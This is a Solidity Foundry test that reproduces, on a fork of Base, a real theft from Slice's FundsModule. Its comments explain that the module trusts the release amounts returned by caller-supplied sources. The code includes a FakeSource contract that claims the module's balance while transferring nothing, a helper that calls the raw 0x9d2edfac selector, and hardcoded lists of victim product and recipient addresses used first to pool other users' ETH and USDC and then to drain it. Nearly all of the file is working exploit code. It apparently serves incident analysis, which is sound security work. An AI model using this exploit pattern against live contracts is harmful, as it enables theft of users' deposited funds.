// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~41K (8.716935563284127414 ETH + 19,820.734002 USDC)
// Attacker : https://basescan.org/address/0xc34572ebb26b9a4c54854aae8d2347108e8c892f
// Attack Contract : https://basescan.org/address/0x8eBC7878287415f1FADCF4Ace8817094E4C86f90
// Victim (FundsModule proxy) : https://basescan.org/address/0x61bcd1ed11fc03c958a847a6687b1875f5eacaaf
// Vulnerable Impl (at attack block) : https://basescan.org/address/0x8db3b6f51b594dc87b87a3a3b844de9c0d8d60b5
// Attack Tx : https://basescan.org/tx/0x02b039a6345348d984e4a0b70dd233127772206e61ce82c390c4709c0b8d790a
//
// @Summary
// Slice's FundsModule exposes one permissionless entry point (selector 0x9d2edfac) that takes a
// caller-supplied list of "source" contracts, a recipient, a token and a boolean. For each source
// the module calls source._releaseFromFundsModule(recipient, token) and trusts the amount it
// returns, crediting the recipient a Deposit of exactly that amount without ever checking that the
// module's own ETH or USDC balance actually went up by it. When the boolean is true the same call
// then pays that credited amount out of the module's pooled reserves to the recipient.
//
// The source list is never checked against an owner-registered or whitelisted set, so an attacker
// can pass their own contract. The two source contracts in the attack returned a non-zero release
// amount while transferring nothing to the module, so the module paid the attacker from reserves
// that other users had funded.
//
// The attack is one atomic transaction in two steps, both through the same 0x9d2edfac entry point:
//   1. Pooling: call it with flag=false against the real Slice product contracts (and the real
//      investors as recipients). Each product releases its backing ETH/USDC into the module, so the
//      pooled reserve is filled from genuine user funds.
//   2. Draining: call it with flag=true against an attacker-deployed fake source that returns the
//      module's current balance while sending nothing. The module credits that amount to the
//      attacker and immediately withdraws it from the pooled reserve.
// Net on-chain: 8.716935563284127414 ETH and 19,820.734002 USDC to the attacker EOA.
//
// @Reconstruction
// Fork Base at the block before the attack. The attacker and the two fake source contracts here are
// freshly deployed; the Slice module and the product contracts are genuine fork state. The pooling
// legs replay the real (source, recipient) pairs from the attack calldata with flag=false; the two
// drain legs select our own FakeSource contracts with flag=true. No bytecode or calldata replay.
//
// @Notes
//  - Neither the attack-block implementation (0x8db3b6f5...) nor the current one (0xf9a0fe07...) is
//    verified on Basescan. The 0x9d2edfac entry point, its (address[],address,address,bool) argument
//    layout and the source callback _releaseFromFundsModule(address,address) were recovered from the
//    on-chain execution trace, so the call is built from the raw selector rather than a named ABI.
//  - The module held essentially nothing before the attack (2 wei ETH, 1 unit USDC). The drained
//    funds were other users' balances held in the individual Slice product contracts; step 1 is how
//    the attacker pooled them into the module through the same bug before stealing them.
//  - Pooling is applied best-effort. All 8 ETH legs reconstruct cleanly; 55 of the 66 USDC legs do.
//    The 11 that revert are releases whose recipient is itself a Slice slicer, a deposit path that
//    does not replay standalone outside the attack's same-block context. They do not feed the
//    module's drainable balance, so the reconstructed drain still matches the on-chain loss to 1 unit.

interface IFundsModule {}

// Attacker-controlled source. Returns a non-zero release amount (the module's live balance) while
// transferring no assets, which is exactly what the real attack's two source contracts did.
contract FakeSource {
    address internal immutable module;
    address internal immutable token; // address(0) == native ETH

    constructor(address _module, address _token) {
        module = _module;
        token = _token;
    }

    function _releaseFromFundsModule(address, address) external view returns (uint256, uint256) {
        uint256 bal = token == address(0) ? module.balance : IERC20(token).balanceOf(module);
        return (bal, 0);
    }
}

contract SliceFundsModuleExploit is Test {
    address internal constant FUNDS_MODULE = 0x61bCd1ED11fC03C958A847A6687b1875f5eAcaaf;
    address internal constant ETH = address(0);
    IERC20 internal constant USDC = IERC20(0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913);
    bytes4 internal constant RELEASE = 0x9d2edfac;

    uint256 internal constant ATTACK_BLOCK = 52_866_122;
    uint256 internal constant DRAINED_ETH = 8_716_935_563_284_127_414;
    uint256 internal constant DRAINED_USDC = 19_820_734_002;

    FakeSource internal ethSource;
    FakeSource internal usdcSource;

    function setUp() public {
        vm.createSelectFork("https://base.gateway.tenderly.co", ATTACK_BLOCK - 1);
        vm.label(FUNDS_MODULE, "FundsModule");
        vm.label(address(USDC), "USDC");
    }

    function testExploit() public {
        ethSource = new FakeSource(FUNDS_MODULE, ETH);
        usdcSource = new FakeSource(FUNDS_MODULE, address(USDC));

        // Step 1: pool genuine ETH reserves out of the real Slice products into the module.
        (address[] memory es, address[] memory et) = _ethLegs();
        for (uint256 i; i < es.length; ++i) {
            _release(es[i], et[i], ETH, false); // tolerant: pool whatever the real products release
        }

        // Step 2: drain the pooled ETH with a fake source that transfers nothing.
        uint256 ethBefore = address(this).balance;
        require(_release(address(ethSource), address(this), ETH, true), "ETH drain failed");
        uint256 ethGain = address(this).balance - ethBefore;

        // Step 3: pool genuine USDC reserves into the module.
        (address[] memory us, address[] memory ut) = _usdcLegs();
        for (uint256 i; i < us.length; ++i) {
            _release(us[i], ut[i], address(USDC), false); // tolerant
        }

        // Step 4: drain the pooled USDC the same way.
        uint256 usdcBefore = USDC.balanceOf(address(this));
        require(_release(address(usdcSource), address(this), address(USDC), true), "USDC drain failed");
        uint256 usdcGain = USDC.balanceOf(address(this)) - usdcBefore;

        console.log("ETH drained  (wei) :", ethGain);
        console.log("USDC drained (unit):", usdcGain);

        // Exact match to within the module's 1-unit floor rounding on the pay-out leg.
        assertApproxEqAbs(ethGain, DRAINED_ETH, 1e9, "ETH drain mismatch");
        assertApproxEqAbs(usdcGain, DRAINED_USDC, 10, "USDC drain mismatch");
    }

    function _release(address src, address to, address token, bool flag) internal returns (bool ok) {
        address[] memory sources = new address[](1);
        sources[0] = src;
        (ok,) = FUNDS_MODULE.call(abi.encodeWithSelector(RELEASE, sources, to, token, flag));
    }

    receive() external payable {}

    function _ethLegs() internal pure returns (address[] memory s, address[] memory t) {
        s = new address[](8); t = new address[](8);
        s[0] = 0xad1E8F109e47D5C9165fBd27429C23f9EbAbA4a5; t[0] = 0x750EcE33f66c3f714F8534c9E94F9c1dF199AAc6;
        s[1] = 0x0c4014533DaC7bc336380D462980FC37d6b1f2D5; t[1] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[2] = 0x949EabB5153Af015B4f2A3DA0b5D7dDA42b51c09; t[2] = 0x7774235C504e44Ac48938689503B0c81178e0Baf;
        s[3] = 0x250fBbf23e69ecC6e5Cc06c53CDc11dc3901CA1F; t[3] = 0x8177b34687bC8B99C205e533ae7DD7c6C9D07a66;
        s[4] = 0x250fBbf23e69ecC6e5Cc06c53CDc11dc3901CA1F; t[4] = 0xf32dd1Bd55bD14d929218499a2E7D106F72f79c7;
        s[5] = 0xAC8f3E2D4Ed834e178DBf27B17396730aB1Fed10; t[5] = 0xDe30040413b26d7Aa2B6Fc4761D80eb35Dcf97aD;
        s[6] = 0xd8E4303E7af3b137Ee96A685b1Fc9ff9f7C48C74; t[6] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[7] = 0x7e96a0898Dc5b9cf6EFBB41A9c55B167E19AE9F2; t[7] = 0x92f551665C69586Fd5f30e6EFdB78aC882B22d17;
    }

    function _usdcLegs() internal pure returns (address[] memory s, address[] memory t) {
        s = new address[](66); t = new address[](66);
        s[0] = 0x8a970ac4Aaa8F4a23B69Ae6708Ff15b054b03bE9; t[0] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[1] = 0xA882C3A1F1a67488fC6C55ebf2aB0d53471e82f3; t[1] = 0x9b1C2FE96F12CC34c32ad9312351AdCa285db03a;
        s[2] = 0xA882C3A1F1a67488fC6C55ebf2aB0d53471e82f3; t[2] = 0x120Ed6d919021Bc14a4FE90aDDb1da5AF068059F;
        s[3] = 0x9302E86E26076Da017D0eDe694A1c0feAFcCAC3b; t[3] = 0x0130898A0f63232512F272BDD5AaD99B0b68430b;
        s[4] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[4] = 0xe243eB923c5089d34EdC4fb82A4175b10113c139;
        s[5] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[5] = 0xf2F9ACDdAa8E1D7B244BE6c36943Cd88702107A5;
        s[6] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[6] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[7] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[7] = 0x18A0Bdabf4438B1Ce975F97D030D671717A5adC8;
        s[8] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[8] = 0xd5ED2d468FFC1f23bD449ecAF78DBF07db0A5AcF;
        s[9] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[9] = 0x7F73903205db9cF15eFf85Ea6dF9669741A2e378;
        s[10] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[10] = 0x6D178746A2B6a87848667782C39a4624b83f42fd;
        s[11] = 0xEcC6D82F05C7d63985bC6D187CAa12718D64474F; t[11] = 0xf7d07Ee99095FDC09001710Ec232162a788BB989;
        s[12] = 0xa08B4d66e1313bb0d72127bE1B3F5d63f88df933; t[12] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[13] = 0x2E509Bc71478ADEc1A5e33Ef393F81A39Ac18dAf; t[13] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[14] = 0x7dF742aAb91bC833462441Ac7A70CE58d25D64A4; t[14] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[15] = 0x186ae0C2A05B26098Cf7DfA2205D73c8e2c06cBE; t[15] = 0x29656C415C099F193D307e77a70F58bB2f094dB2;
        s[16] = 0x107c22449c83883e6990BbC06641208E2D7D6a23; t[16] = 0x03489E02BF56B43a8e91287E8cFef76a7a6a9aa3;
        s[17] = 0x757b6cCe9C2154Ce77D9b930A1FA2A6C26fcaf12; t[17] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[18] = 0x757b6cCe9C2154Ce77D9b930A1FA2A6C26fcaf12; t[18] = 0xD9E1B1a9D5DCc1869beaC6712959C2b88473C0EC;
        s[19] = 0x959eB3DC5f10f3460edA31E6f195dA4F8a66c8dd; t[19] = 0x70E341f61D7EFC67B96d2FEff25a0FA74f27Efb0;
        s[20] = 0x9b8EBb7454801f22025FCa9244cc6c06f91814B3; t[20] = 0x60A0164463f3dC6c27e0AF42D1F64ab8BF225578;
        s[21] = 0x50a9CFd17f8131e94B43eb2A43F33dD887A5b755; t[21] = 0xc2167A2dFf969FAA3B0BdfBB878230556735BD4a;
        s[22] = 0xC1e68c574502D13B69b24a61d89DB7D841E3A181; t[22] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[23] = 0x75Cb3bC919f7B89426B0432fb498bbcb8dA9E0cf; t[23] = 0x55C88bB05602Da94fCe8FEadc1cbebF5B72c2453;
        s[24] = 0x5903be27f03A95658c48AB8De2aeBCC9ae3da1aB; t[24] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[25] = 0x7E1d1cD67CAc585948324d6b1dc092926738b7dD; t[25] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[26] = 0x934423e2153EFb55CA277A782b4C7bc7d7a6C477; t[26] = 0x120Ed6d919021Bc14a4FE90aDDb1da5AF068059F;
        s[27] = 0xF5E46B4bAA98d7fE40fe6CA89D7dC7Bc62624178; t[27] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[28] = 0xca9ee0d68eC9d59cB8fC02670A33BBe852fA8AD7; t[28] = 0x1cFd452EB369a7B9475B07D1457dd1d0500fD788;
        s[29] = 0x63F393681076D65d4CBB15307e546766d081a1Ac; t[29] = 0x308112D06027Cd838627b94dDFC16ea6B4D90004;
        s[30] = 0x359B34CFF558c72726F17C5B968AC63Eba6be416; t[30] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[31] = 0xf71fc06538673F3d5e74Bf44fa1498f997EE3766; t[31] = 0x44b1b486Ce8d9C82f605626347a7B1F74ADD11DE;
        s[32] = 0xf1e953EFFb4abf80290EcBde440bC64Aa4fb84De; t[32] = 0xC324388769FfD0516DD0262EF74FB70BB1ed463e;
        s[33] = 0x575a9ADc1429E239331e73619AF20E34607F55Ba; t[33] = 0xEE1E0E3e500f2065e5f2042b1b1a52d6faeAAa93;
        s[34] = 0x1c563F9992cfE6Df54d6fe55aA28207CEfb864b1; t[34] = 0xc2167A2dFf969FAA3B0BdfBB878230556735BD4a;
        s[35] = 0x12Ec69A17f2203E8A0512eF6390555343366c819; t[35] = 0xE97022E3e50Ac76D20f5138141d79f65aCf3bc82;
        s[36] = 0xf88259A744C19EecE436Cf9DeE8779C4dcdB1c1a; t[36] = 0x6A5d6df3fD5b9D16A03DC2C65d14b47Db0968DE0;
        s[37] = 0x979b77f60689F6D8466a0F4c19Bb3b31AaEeC7c0; t[37] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[38] = 0x7A2f9fb4724aAeC5a17D5c8ce72b4B7e368A7daf; t[38] = 0xBBa294D303555032C6BD1021C639654b95e77Fa8;
        s[39] = 0xBE81eC78EB4f8515506a90e40db4Bee46A737F7A; t[39] = 0x0Cb57e00757A09d4C4289A4b2E4A70C7Ce56903A;
        s[40] = 0x9711FC0107298966FB6E3F57ad01931BC2162524; t[40] = 0x4dc9D5538f4F066206fBE8a637f5D970f1e34ed3;
        s[41] = 0x42d1621Ded31c07B6e2E59ED82Dc84aC96e01374; t[41] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[42] = 0x328B18fcF8cE6D414a5EBC1680da76E0Df4c1de3; t[42] = 0x432716Cf2A3E42a327361b3b7B7D57A8d4A8948C;
        s[43] = 0x0B1fc7CDF404632f27d1507bB0E70C838682D567; t[43] = 0xbEa92931Fb1AbEc26EC0a081aAb3131d1e7e7866;
        s[44] = 0x6DEbC084d4E8eCA970971F3F2939B7c757486A39; t[44] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[45] = 0x251134424E4d462ED1181067a25CC6fA765d109d; t[45] = 0x2117bf88b4Cb0186eaA87500A045fc998290E42a;
        s[46] = 0x4A453a0ce41f373B74D8Ab4D1BB947F753996B0a; t[46] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[47] = 0x5e9496FB27408ed3403201aD50eF8b3e32a00644; t[47] = 0x2F5B20f1873deccae1Ae9a2fFFf096fB5BDC0665;
        s[48] = 0x4A58E5e2bAEb6aCb203cAF74432396Fe4C4d88d9; t[48] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[49] = 0xD0AF7389f7529686EA62Bc0800cEF47951702871; t[49] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[50] = 0x47ADc84F69B37906fCa8B058034FAd28250E97d4; t[50] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[51] = 0xaBa96235e8711646A9D62f3ca210F2Ee5C2a4128; t[51] = 0xcd3E2237f4e9275fEF664d7C9bFA81cD5613c95b;
        s[52] = 0xFd52CE96a172c4b385e8108aE900F334654337fD; t[52] = 0x52eE6534a115E9C66681EF2EAb28cA0754b86A1d;
        s[53] = 0xE6a512196c687C23F75dd603a4d80C92c4bFfa5e; t[53] = 0xaB6aF22C2E8969c1437e864B3b2e169949e6263A;
        s[54] = 0xAFCA8D074DeD5B61BD0110ff862eC98FF6fd820b; t[54] = 0xc2167A2dFf969FAA3B0BdfBB878230556735BD4a;
        s[55] = 0x3EdD67a61136697DA7144e97dd306809D4404488; t[55] = 0x2270a4ca23614eCE42905045b1fF2CB2a396c4Ff;
        s[56] = 0x6b75e3c7f1837A60D61cA924D7b12c20FC8228fA; t[56] = 0xF6bA9cFAA9EB5b3a23D8a837Bc326f2C297ae283;
        s[57] = 0x0c4014533DaC7bc336380D462980FC37d6b1f2D5; t[57] = 0xAe009d532328FF09e09E5d506aB5BBeC3c25c0FF;
        s[58] = 0x6f0Da6D2F77053ef671a6dBDCDeC21946Be09017; t[58] = 0xc2167A2dFf969FAA3B0BdfBB878230556735BD4a;
        s[59] = 0x44E643832bA17BfFCFe165Ea743aBdBd78a0373B; t[59] = 0x6Af6d6B3fBa247129c32544b53106AB3bb772902;
        s[60] = 0x44E643832bA17BfFCFe165Ea743aBdBd78a0373B; t[60] = 0xe28F1895B2c820b3b7B23c95b234dd99f17e815d;
        s[61] = 0x44E643832bA17BfFCFe165Ea743aBdBd78a0373B; t[61] = 0x3Cc1A943B27c2AF7c6dcF3Be0137f66c2f22E712;
        s[62] = 0x44E643832bA17BfFCFe165Ea743aBdBd78a0373B; t[62] = 0x7fb9f1e0bc85cFA1795f956604474A08c0afd798;
        s[63] = 0x44E643832bA17BfFCFe165Ea743aBdBd78a0373B; t[63] = 0xbef65BF144bdEa1667A74F14aD552c751aD4C056;
        s[64] = 0xbd5EF526a9B432BD3d440C347290dDC181bb681e; t[64] = 0xe8bB2E08e6f52f11D8B65e2A3db772DaA60e117e;
        s[65] = 0x515e3e245cfF1D2e270D456f674b96B9ECD3535F; t[65] = 0xBC1dfdc491bf396a733E567fabF0286d53Bb4292;
    }
}
